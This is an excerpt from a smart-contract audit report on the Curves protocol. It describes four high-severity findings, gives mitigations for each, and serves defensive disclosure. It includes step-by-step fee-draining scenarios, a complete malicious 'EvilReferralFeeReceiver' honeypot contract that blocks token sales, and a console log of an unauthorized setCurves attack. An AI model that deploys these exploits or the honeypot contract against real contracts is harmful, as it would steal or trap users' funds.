# 2024-01-curves Report

## [H-02] Unrestricted claiming of fees due to missing balance updates in FeeSplitter

*Submitted by [EV_om](https://github.com/code-423n4/2024-01-curves-findings/issues/247) , also found by [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/1551) , [Tychai0s](https://github.com/code-423n4/2024-01-curves-findings/issues/1491) , [visualbits](https://github.com/code-423n4/2024-01-curves-findings/issues/1471) , [Josephdara_0xTiwa](https://github.com/code-423n4/2024-01-curves-findings/issues/1401) , [kuprum](https://github.com/code-423n4/2024-01-curves-findings/issues/1396) , [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1394) , [peritoflores](https://github.com/code-423n4/2024-01-curves-findings/issues/1393) , [Tumelo_Crypto](https://github.com/code-423n4/2024-01-curves-findings/issues/1341) , [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1322) , [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1274) , nonseodion ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1272) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1170) ), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1236) , [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/1225) , [Kong](https://github.com/code-423n4/2024-01-curves-findings/issues/1220) , 0xPhantom ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1214) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1145) ), [jangle](https://github.com/code-423n4/2024-01-curves-findings/issues/1204) , [rouhsamad](https://github.com/code-423n4/2024-01-curves-findings/issues/1143) , Soul22 ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1139) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1135) ), btk ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1127) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/916) ), [0xE1](https://github.com/code-423n4/2024-01-curves-findings/issues/1089) , [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1074) , Varun_05 ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1053) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1044) ), [0xmystery](https://github.com/code-423n4/2024-01-curves-findings/issues/1045) , jacopod ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1035) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1028) , [3](https://github.com/code-423n4/2024-01-curves-findings/issues/1025) ), wangxx2026 ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/1008) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/778) ), [novodelta](https://github.com/code-423n4/2024-01-curves-findings/issues/975) , ubermensch ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/956) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/955) ), Draiakoo ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/941) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/939) ), [0xprinc](https://github.com/code-423n4/2024-01-curves-findings/issues/894) , [santipu_](https://github.com/code-423n4/2024-01-curves-findings/issues/893) , [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/883) , 0xc0ffEE ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/850) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/848) ), petro_1912 ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/817) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/100) ), [almurhasan](https://github.com/code-423n4/2024-01-curves-findings/issues/805) , [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/789) , [0xNaN](https://github.com/code-423n4/2024-01-curves-findings/issues/777) , zhaojie ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/745) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/744) ), [khramov](https://github.com/code-423n4/2024-01-curves-findings/issues/711) , [al88nsk](https://github.com/code-423n4/2024-01-curves-findings/issues/653) , [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/642) , [Lalanda](https://github.com/code-423n4/2024-01-curves-findings/issues/636) , iamandreiski ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/615) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/519) ), jasonxiale ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/602) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/598) ), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/587) , [pep7siup](https://github.com/code-423n4/2024-01-curves-findings/issues/556) , [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/541) , [0xLogos](https://github.com/code-423n4/2024-01-curves-findings/issues/513) , [salutemada](https://github.com/code-423n4/2024-01-curves-findings/issues/512) , oreztker ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/497) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/493) ), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/477) , peanuts ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/439) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/222) ), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/418) , [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/408) , [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/404) , [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/392) , [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/375) , [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/355) , [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/334) , [dopeflamingo](https://github.com/code-423n4/2024-01-curves-findings/issues/330) , [nmirchev8](https://github.com/code-423n4/2024-01-curves-findings/issues/303) , hals ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/298) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/297) ), [Krace](https://github.com/code-423n4/2024-01-curves-findings/issues/289) , [klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/274) , [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/267) , [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/236) , [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/226) , [pkqs90](https://github.com/code-423n4/2024-01-curves-findings/issues/198) , AlexCzm ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/149) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/141) , [3](https://github.com/code-423n4/2024-01-curves-findings/issues/134) ), [0xMAKEOUTHILL](https://github.com/code-423n4/2024-01-curves-findings/issues/144) , [ptsanev](https://github.com/code-423n4/2024-01-curves-findings/issues/109) , [Kow](https://github.com/code-423n4/2024-01-curves-findings/issues/92) , [israeladelaja](https://github.com/code-423n4/2024-01-curves-findings/issues/91) , [rvierdiiev](https://github.com/code-423n4/2024-01-curves-findings/issues/68) , kutugu ( [1](https://github.com/code-423n4/2024-01-curves-findings/issues/45) , [2](https://github.com/code-423n4/2024-01-curves-findings/issues/41) ), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/874) , [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/1523) , [d3e4](https://github.com/code-423n4/2024-01-curves-findings/issues/1462) , [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1437) , [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1312) , [0xE1](https://github.com/code-423n4/2024-01-curves-findings/issues/1232) , [Soul22](https://github.com/code-423n4/2024-01-curves-findings/issues/1123) , and [0xStalin](https://github.com/code-423n4/2024-01-curves-findings/issues/1066) **

The `FeeSplitter` contract is designed to distribute fees among token holders. It employs an accumulator pattern to distribute rewards over time among users who do not sell or withdraw their tokens as ERC20s. This pattern works by maintaining an accumulator representing the cumulative total of the reward rate over time, and updating it for each user every time their balance changes.

However, the current implementation does not update the accumulator associated with each user during token transfers, deposits, or withdrawals. The [onBalanceChange()](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L96) function, which is responsible for updating the accumulator following changes in a user’s balance, is exclusively called from [Curves._transferFees()](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L218) , which is only called during buy and sell transactions.

This oversight can be easily exploited to drain the `FeeSplitter` contract of its fees. An attacker could repeatedly transfer the same tokens to new accounts and claim fees every time. This is possible because `data.userFeeOffset[account]` will be zero for every new account they transfer to, while the claimable rewards are [calculated](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L87) using the current balance returned by the Curves contract.

Since there is no limit to the amount of rewards that may accumulate in the `FeeSplitter` contract, this can be considered loss of matured yield and is hence classified as high severity.

Consider the following scenario:

1. Alice buys any amount of curve tokens.
2. Alice transfers her tokens to a new account, Account1, by calling transferCurvesToken().
3. The onBalanceChange() function is not triggered during the transfer, so data.userFeeOffset[account] for Account1 is not updated.
4. Account1 can now call FeeSplitter.claimFees() and will receive fees as if it had been holding the tokens since the beginning, as data.userFeeOffset[account] for this account is 0.
https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L88
function updateFeeCredit(address token, address account) internal {
    TokenData storage data = tokensData[token];
    uint256 balance = balanceOf(token, account);
    if (balance > 0) {
        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
        data.unclaimedFees[account] += owed / PRECISION;
        data.userFeeOffset[account] = data.cumulativeFeePerToken;
    }
}

...

function claimFees(address token) external {
    updateFeeCredit(token, msg.sender);
    uint256 claimable = getClaimableFees(token, msg.sender);
    if (claimable == 0) revert NoFeesToClaim();
    tokensData[token].unclaimedFees[msg.sender] = 0;
    payable(msg.sender).transfer(claimable);
    emit FeesClaimed(token, msg.sender, claimable);
}
5. Alice creates another new account, Account2, and transfers the tokens from Account1 to Account2.
6. The onBalanceChange(token, account) function is not triggered during this transfer, so data.userFeeOffset[account] for Account2 is zero.
7. Account2 can now claim fees.
8. Alice can repeat this process, creating new accounts and transferring tokens between them, to drain the contract of its fees.

To mitigate this issue, the `onBalanceChange(token, account)` function should be triggered during all token transfers, deposits, and withdrawals. For token transfers, it should be triggered for both accounts. This will ensure that `userFeeOffset` is accurately tracked, preventing users from claiming fees multiple times.

**raymondfam (Lookout) commented:**

> The root cause is due to not calling updateFeeCredit() diligently.

**andresaiello (Curves) confirmed**

## [H-03] Attack to make CurveSubject to be a HoneyPot

*Submitted by KingNFT, also found by lukejohn, 0xmystery, DimaKush, vnavascues, Matue, adamn000, Kose, 0xDemon (1, 2), jacopod, 0xStalin, MrPotatoMagic, 42TechLabs, oxTory, nnez, yixxas, ktg, thank_you, ubermensch, opposingmonkey, nonseodion, btk, matejdb, 0xc0ffEE, salutemada, novodelta, zhaojie, _eperezok, sl1, mrudenko, PENGUN, osmanozdemir1, spacelord47, mahdirostami, DarkTower, InAllHonesty, SpicyMeatball, alexfilippov314 (1, 2), oreztker, Timenov, zhaojohnson, eeshenggoh, SovaSlava, dimulski, UbiquitousComputing, cats, Soliditors, nmirchev8, darksnow, BugzyVonBuggernaut, hals, ke1caM, peanuts, EV_om, cccz, bronze_pickaxe, OMEN, 0xMAKEOUTHILL, aslanbek, israeladelaja, Kow, and haxatron* ,

Any `CurveSubjects` clould be turned to a `HoneyPot` by the creator of `CurveSubject` , which causes that users can only buy but can’t sell the curve tokens any more. Then malicious creators can sell their own tokens at a high price to make profit.

1. First, please pay attention on L241 of Curves._transferFees() function: we can see the referralFeeDestination is  always be called even when referralFee is 0, and if the call fails the whole transaction would revert.

```
File: contracts\Curves.sol
218:     function _transferFees(
...
224:     ) internal {
225:         (uint256 protocolFee, uint256 subjectFee, uint256 referralFee, uint256 holderFee, ) = getFees(price);
226:         {
227:             bool referralDefined = referralFeeDestination[curvesTokenSubject] != address(0);
228:             {
229:                 address firstDestination = isBuy ? feesEconomics.protocolFeeDestination : msg.sender;
230:                 uint256 buyValue = referralDefined ? protocolFee : protocolFee + referralFee;
231:                 uint256 sellValue = price - protocolFee - subjectFee - referralFee - holderFee;
232:                 (bool success1, ) = firstDestination.call{value: isBuy ? buyValue : sellValue}("");
233:                 if (!success1) revert CannotSendFunds();
234:             }
235:             {
236:                 (bool success2, ) = curvesTokenSubject.call{value: subjectFee}(""); 
237:                 if (!success2) revert CannotSendFunds();
238:             }
239:             {
240:                 (bool success3, ) = referralDefined
                           // @audit always be called even when referralFee is 0
241:                     ? referralFeeDestination[curvesTokenSubject].call{value: referralFee}("") 
242:                     : (true, bytes(""));
243:                 if (!success3) revert CannotSendFunds();
244:             }
245: 
246:             if (feesEconomics.holdersFeePercent > 0 && address(feeRedistributor) != address(0)) {
247:                 feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
248:                 feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
249:             }
250:         }
...
261:     }
```

1. And, we also find the  referralFeeDestination could be set and updated by creator of CurveSubject at any time.

```
File: contracts\Curves.sol
155:     function setReferralFeeDestination(
156:         address curvesTokenSubject,
157:         address referralFeeDestination_
158:     ) public onlyTokenSubject(curvesTokenSubject) {
159:         referralFeeDestination[curvesTokenSubject] = referralFeeDestination_;
160:     }
```

By exploiting the above two facts, we can design the following malicious `EvilReferralFeeReceiver` contract. Once it was set as `ReferralFeeDestination` , the `HoneyPot` mode is enabled, users can only buy but can’t sell the related curve tokens any more.

```
// @note: put in file: 2024-01-curves\contracts\Test\EvilReferralFeeReceiver.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ICurves {
    function curvesTokenBalance(address subject, address account) external view returns (uint256);
}

contract EvilReferralFeeReceiver is Ownable {
    ICurves private _curves;
    address private _subject;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _allowlist;

    function setCurvesAndSubject(address curves, address subject) external onlyOwner {
        _curves = ICurves(curves);
        _subject = subject;
    }

    function setAllowList(address account, bool allow) external onlyOwner {
        _allowlist[account] = allow;
    }

    function updateBalances(address[] memory accounts) external onlyOwner {
        for (uint256 i; i < accounts.length; ++i) {
            address account = accounts[i];
            _balances[account] = _curves.curvesTokenBalance(_subject, account);
        }
    }

    receive() external payable {
        if (_allowlist[tx.origin]) return;
        // only buy, can't sell
        uint256 newBalance = _curves.curvesTokenBalance(_subject, tx.origin);
        if (newBalance <= _balances[tx.origin]) revert("Honey Pot");
        _balances[tx.origin] = newBalance;
    }
}
```

The full coded PoC:

The test logs:

Solady’s `forceSafeTransferETH()` seems suitable for this case:

[https://github.com/Vectorized/solady/blob/61612f187debb7affbe109543556666ef716ef69/src/utils/SafeTransferLib.sol#L117](https://github.com/Vectorized/solady/blob/61612f187debb7affbe109543556666ef716ef69/src/utils/SafeTransferLib.sol#L117)

**andresaiello (Curves) confirmed**

**alcueca (Judge) commented:**

> Keeping as High because with this the DAO controlling the platform would have to do an enormous effort to keep scammers out.

## [H-04] Unauthorized Access to setCurves Function

*Submitted by parlayan_yildizlar_takimi, also found by Avci, 0x11singh99, visualbits, bigtone, djxploit, 0xMango, Arion, Nachoxt17, m4ttm, Ephraim, GhK3Ndf, spark, karanctf, LeoGold, peritoflores, Matue, dutra, dyoff, vnavascues, Josephdara_0xTiwa, SanketKogekar, Kose, Faith, McToady, santipu_, imare, jangle, Aymen0909, ktg, ivanov, bengyles (1, 2), Nikki, 0xAadi, kuprum, Zach_166, c0pp3rscr3w3r, 0xhashiman, burhan_khaja, anshujalan, The-Seraphs, mitev, Soul22, ArsenLupin, rouhsamad, DimaKush, tonisives, kodak_rome, adamn000, TermoHash, nazirite, 0xStalin, baice, Ryonen, cu5t0mpeo, whoismatthewmc1, FastChecker, bbl4de, Mike_Bello90, erebus, ether_sky, Draiakoo, opposingmonkey, btk, azanux, 0xSmartContract, XDZIBECX, Varun_05, ahmedaghadi, novodelta, Mj0ln1r, Berring, VigilantE, MrPotatoMagic, 0xc0ffEE, LouisTsai, nonseodion, forkforkdog, codegpt, Kong, DanielArmstrong, kodyvim, 0xprinc, Cosine, salutemada, th13vn, Inspex, popelev, grearlake, zhaojie, _eperezok, jacopod, 0xNaN, PoeAudits, Oxsadeeq, khramov, 0xblackskull, bareli, KHOROAMU, para8956, KingNFT, 0xPhantom, 13u9, sl1, AmitN, wangxx2026, pipidu83, XORs33r, mahdirostami, Prathik3, merlinboii, PENGUN, jasonxiale, pep7siup, lukejohn, spacelord47, danb, dd0x7e8, Lirios, 0xLogos, alexfilippov314, DMoore, iamandreiski, PetarTolev, zhaojohnson, iberry, eeshenggoh, zxriptor, Kaysoft, SovaSlava, oreztker, nmirchev8, UbiquitousComputing, dimulski, BowTiedOriole, jesjupyter, SpicyMeatball, zaevlad, Lef, Bobface, darksnow, KupiaSec, hals, Stormreckson, 0x111, klau5, ke1caM, peanuts, n1punp, cats, EV_om, bronze_pickaxe, cartlex_, rudolph, L0s1, deepplus, Inference, 0xMAKEOUTHILL, lil_eth, polarzero, Timenov, IceBear, nuthan2x, ubl4nk, skyge, AlexCzm, andywer, mrudenko, alexbabits, pipoca, Timeless, y4y, kutugu, Krace, ravikiranweb3, haxatron, and Soliditors*

The `FeeSplitter.sol` contract, which is responsible for fee distribution and claiming, contains a significant security vulnerability related to the `setCurves` function. This function allows updating the reference to the `Curves` contract. However, as it currently stands, any user, including a malicious actor, can call `setCurves` . This vulnerability can be exploited to redirect the contract’s reference to a fake or malicious `Curves` contract ( `FakeCurves.sol` ), enabling manipulation of critical calculations used in fee distribution.

The exploit allows an attacker to set arbitrary values for `curvesTokenBalance` and `curvesTokenSupply` in the fake `Curves` contract. By manipulating these values, the attacker can falsely inflate their claimable fees, leading to unauthorized profit at the expense of legitimate token holders.

**Steps:**

1. Deploy the FeeSplitter and FakeCurves contracts.
2. As an attacker, call setCurves on FeeSplitter to update the curves reference to the deployed FakeCurves contract.
3. Manipulate curvesTokenBalance and curvesTokenSupply in FakeCurves to create false balances and supplies.
4. Call getClaimableFees in FeeSplitter to calculate inflated claimable fees based on the manipulated values.
5. Observe that the attacker is able to claim fees that they are not entitled to.

**Code:**

```
>>> feeRedistributor.getClaimableFees(randomToken, attacker)
0
>>> feeRedistributor.setCurves(fakeCurves,{'from': attacker})
Transaction sent: 0x6480994a739ab1541d4eb596fd73a49d55b59b6c7080a7cbb10d0b72f619b799
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 9
  FeeSplitter.setCurves confirmed   Block: 17   Gas used: 27607 (0.23%)

<Transaction '0x6480994a739ab1541d4eb596fd73a49d55b59b6c7080a7cbb10d0b72f619b799'>
>>> fakeCurves.setCurvesTokenSupply(randomToken, 250, {'from': attacker})
Transaction sent: 0xd9c0938f9876348657bf5ef8e7e84706b0ddf287da69169716ca6af22a3c059d
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 10
  FakeCurves.setCurvesTokenSupply confirmed   Block: 18   Gas used: 22786 (0.19%)

<Transaction '0xd9c0938f9876348657bf5ef8e7e84706b0ddf287da69169716ca6af22a3c059d'>
>>> fakeCurves.setCurvesTokenBalance(randomToken, attacker, 249, {'from': attacker})
Transaction sent: 0x742b4aac4d03210fc4869a75dd625fdbf52838655f57ddf8e028dfbaa6818932
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 11
  FakeCurves.setCurvesTokenBalance confirmed   Block: 19   Gas used: 23361 (0.19%)

<Transaction '0x742b4aac4d03210fc4869a75dd625fdbf52838655f57ddf8e028dfbaa6818932'>
>>> feeRedistributor.getClaimableFees(randomToken, attacker)
996000000000000000
```

To mitigate this vulnerability, the `setCurves` function in `FeeSplitter.sol` should be restricted to be callable only by the owner or a trusted manager. This can be achieved by using the `onlyOwner` or `onlyManager` modifier (from the inherited `Security.sol` contract) in the `setCurves` function.

The modified `setCurves` function should look like this:

```
function setCurves(Curves curves_) public onlyOwner {
    curves = curves_;
}
```

or, if managers are also trusted to perform this action,

```
function setCurves(Curves curves_) public onlyManager {
    curves = curves_;
}
```

**andresaiello (Curves) confirmed**

## [H-05] Malformed equate statement

*Submitted by ChaseTheLight*

*Note: This finding was reported via the winning Automated Findings report. It was declared out of scope for the audit, but is being included here for completeness.*

[8](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Security.sol#L8-L9) , [13](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Security.sol#L13-L14)

Using the provided modifier `onlyOwner` for function access control without a proper enforcement mechanism like `require` or `revert` is a dire mistake because it fails to restrict access as intended. The modifier merely evaluates a condition ( `msg.sender == owner` ) without any action taken based on the result. This means any user, regardless of whether they are the owner, can execute functions that are supposed to be restricted to the owner, potentially leading to unauthorized actions, such as withdrawing funds or altering critical contract settings.

To fix this, the modifier should enforce the ownership check using a `require` statement:

```
modifier onlyOwner() {
  require(msg.sender == owner, "Caller is not the owner");
  _;
}
```

With this correction, the modifier effectively ensures that only the account designated as `owner` can access the function. If a non-owner attempts to call the function, the transaction is reverted, maintaining the intended access control and contract integrity.

```
8:     modifier onlyOwner() { // <= FOUND
9:         msg.sender == owner; // <= FOUND
10:         _;
11:     }
```

```
13:     modifier onlyManager() { // <= FOUND
14:         managers[msg.sender] == true; // <= FOUND
15:         _;
16:     }
```

**andresaiello (Curves) confirmed**
